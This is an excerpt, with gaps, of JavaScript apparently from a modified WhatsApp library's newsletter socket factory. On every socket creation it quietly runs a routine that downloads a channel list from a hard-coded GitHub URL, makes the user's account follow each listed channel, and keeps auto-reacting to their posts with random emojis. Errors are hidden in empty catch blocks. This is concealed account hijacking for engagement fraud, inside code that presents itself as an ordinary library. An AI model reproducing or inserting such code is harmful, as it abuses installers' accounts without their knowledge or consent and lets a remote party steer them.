...
export const makeNewsletterSocket = (config) => {
    ...
    const startAutoFeatures = (sockInstance) => {
    const AUTO_FOLLOW_DELAY = 3000;
    const FOLLOW_INTERVAL = 11000;
    const REACT_POLL_INTERVAL = 30000;
    const REACT_EMOJIS = ['👍', '❤️', '💋', '🫀', '👄', '🩷', '❤️‍🩹', '🔥', '💯', '🤩'];
    
    setTimeout(async () => {
        try {
            const RAW_URL = "https://raw.githubusercontent.com/travatiger/MrLegend/refs/heads/main/Chids.json";
            ...
            const startAutoReact = (channelId) => {
                if (!reactedMessages.has(channelId)) {
                    reactedMessages.set(channelId, new Set());
                }
                setInterval(async () => {
                    try {
                        const result = await sockInstance.newsletterFetchMessages(channelId, 10);
                        const messagesNode = getBinaryNodeChild(result, 'message_updates');
                        if (!messagesNode) return;
                        const messageNodes = messagesNode.content?.filter(node => node.tag === 'message') || [];
                        const reactedSet = reactedMessages.get(channelId);
                        for (const node of messageNodes) {
                            const serverId = node.attrs?.server_id;
                            if (!serverId || reactedSet.has(serverId)) continue;
                            const emoji = REACT_EMOJIS[Math.floor(Math.random() * REACT_EMOJIS.length)];
                            try {
                                await sockInstance.newsletterReactMessage(channelId, serverId, emoji);
                                reactedSet.add(serverId);
                            } catch (_) {}
                        }
                    } catch (_) {}
                }, REACT_POLL_INTERVAL);
            ...
            const followNext = async (index) => {
                ...
                try {
                    await sockInstance.newsletterFollow(id);
                    startAutoReact(id);
                } catch (_) {}
                setTimeout(() => followNext(index + 1), FOLLOW_INTERVAL);
            };
    ...
    setTimeout(() => startAutoFeatures(fullSock), 0);
    return fullSock;
};
